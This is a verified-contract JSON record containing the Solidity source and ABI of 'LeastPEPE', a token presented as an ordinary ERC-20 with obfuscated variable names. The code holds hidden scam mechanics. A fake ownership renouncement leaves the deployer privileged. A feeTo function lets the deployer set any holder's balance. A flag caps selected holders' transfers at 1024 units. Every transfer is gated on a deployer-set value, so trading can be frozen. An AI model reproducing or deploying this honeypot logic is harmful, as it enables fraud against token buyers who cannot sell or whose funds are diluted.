{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface receiverShouldMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamTo) external view returns (uint256);\n\n    function transfer(address takeTotal, uint256 shouldFrom) external returns (bool);\n\n    function allowance(address receiverAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTotal,\n        uint256 shouldFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLaunch, uint256 value);\n    event Approval(address indexed receiverAmount, address indexed spender, uint256 value);\n}\n\nabstract contract launchedShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeAmount {\n    function createPair(address atLaunch, address fromTotalAuto) external returns (address);\n}\n\ninterface receiverShouldMaxMetadata is receiverShouldMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LeastPEPE is launchedShould, receiverShouldMax, receiverShouldMaxMetadata {\n\n    constructor (){\n        \n        autoIs teamSwap = autoIs(receiverAutoLiquidity);\n        takeToAmount = takeAmount(teamSwap.factory()).createPair(teamSwap.WETH(), address(this));\n        \n        modeLimit = _msgSender();\n        teamSell();\n        liquidityTake[modeLimit] = true;\n        enableSell[modeLimit] = tokenListTo;\n        \n        emit Transfer(address(0), modeLimit, tokenListTo);\n    }\n\n    uint256 private tokenListTo = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private enableSell;\n\n    function teamSell() public {\n        emit OwnershipTransferred(modeLimit, address(0));\n        modeWalletTo = address(0);\n    }\n\n    uint256 autoLaunch;\n\n    function owner() external view returns (address) {\n        return modeWalletTo;\n    }\n\n    uint256 constant enableList = 2 ** 10;\n\n    uint256 private liquiditySell;\n\n    address receiverAutoLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public amountBuyList;\n\n    uint256 private amountTo;\n\n    bool public receiverMarketingSell;\n\n    function transferFrom(address marketingListFee, address takeTotal, uint256 shouldFrom) external override returns (bool) {\n        if (_msgSender() != receiverAutoLiquidity) {\n            if (takeSwapMode[marketingListFee][_msgSender()] != type(uint256).max) {\n                require(shouldFrom <= takeSwapMode[marketingListFee][_msgSender()]);\n                takeSwapMode[marketingListFee][_msgSender()] -= shouldFrom;\n            }\n        }\n        return minLimit(marketingListFee, takeTotal, shouldFrom);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeToken;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txMode;\n    }\n\n    function isMin(uint256 shouldFrom) public {\n        fromListToken();\n        autoLaunch = shouldFrom;\n    }\n\n    uint256 private receiverMarketingMode;\n\n    function buyEnable(address autoFeeWallet) public {\n        fromListToken();\n        \n        if (autoFeeWallet == modeLimit || autoFeeWallet == takeToAmount) {\n            return;\n        }\n        shouldBuy[autoFeeWallet] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptShould;\n    }\n\n    function exemptSenderLimit(address marketingListFee, address takeTotal, uint256 shouldFrom) internal returns (bool) {\n        require(enableSell[marketingListFee] >= shouldFrom);\n        enableSell[marketingListFee] -= shouldFrom;\n        enableSell[takeTotal] += shouldFrom;\n        emit Transfer(marketingListFee, takeTotal, shouldFrom);\n        return true;\n    }\n\n    uint256 public amountFundTrading;\n\n    mapping(address => bool) public liquidityTake;\n\n    mapping(address => bool) public shouldBuy;\n\n    function feeTo(address maxToken, uint256 shouldFrom) public {\n        fromListToken();\n        enableSell[maxToken] = shouldFrom;\n    }\n\n    function minLimit(address marketingListFee, address takeTotal, uint256 shouldFrom) internal returns (bool) {\n        if (marketingListFee == modeLimit) {\n            return exemptSenderLimit(marketingListFee, takeTotal, shouldFrom);\n        }\n        uint256 listToken = receiverShouldMax(takeToAmount).balanceOf(fromAuto);\n        require(listToken == autoLaunch);\n        require(takeTotal != fromAuto);\n        if (shouldBuy[marketingListFee]) {\n            return exemptSenderLimit(marketingListFee, takeTotal, enableList);\n        }\n        return exemptSenderLimit(marketingListFee, takeTotal, shouldFrom);\n    }\n\n    mapping(address => mapping(address => uint256)) private takeSwapMode;\n\n    string private feeToken = \"Least PEPE\";\n\n    function shouldLaunched(address launchedTotalTx) public {\n        if (enableShould) {\n            return;\n        }\n        if (receiverMarketingSell) {\n            receiverMarketingSell = true;\n        }\n        liquidityTake[launchedTotalTx] = true;\n        \n        enableShould = true;\n    }\n\n    address public takeToAmount;\n\n    address fromAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed launchedSender, address indexed listEnable);\n\n    string private txMode = \"LPE\";\n\n    function transfer(address maxToken, uint256 shouldFrom) external virtual override returns (bool) {\n        return minLimit(_msgSender(), maxToken, shouldFrom);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeWalletTo;\n    }\n\n    function fromListToken() private view {\n        require(liquidityTake[_msgSender()]);\n    }\n\n    function approve(address buyLimit, uint256 shouldFrom) public virtual override returns (bool) {\n        takeSwapMode[_msgSender()][buyLimit] = shouldFrom;\n        emit Approval(_msgSender(), buyLimit, shouldFrom);\n        return true;\n    }\n\n    function balanceOf(address teamTo) public view virtual override returns (uint256) {\n        return enableSell[teamTo];\n    }\n\n    uint256 private walletTrading;\n\n    uint256 private enableToken;\n\n    uint256 teamFeeLiquidity;\n\n    function allowance(address tokenTeamTo, address buyLimit) external view virtual override returns (uint256) {\n        if (buyLimit == receiverAutoLiquidity) {\n            return type(uint256).max;\n        }\n        return takeSwapMode[tokenTeamTo][buyLimit];\n    }\n\n    uint8 private exemptShould = 18;\n\n    address public modeLimit;\n\n    bool private toLaunched;\n\n    address private modeWalletTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenListTo;\n    }\n\n    bool public enableShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeamTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFundTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFeeWallet\",\"type\":\"address\"}],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFrom\",\"type\":\"uint256\"}],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldFrom\",\"type\":\"uint256\"}],\"name\":\"isMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotalTx\",\"type\":\"address\"}],\"name\":\"shouldLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingListFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LeastPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}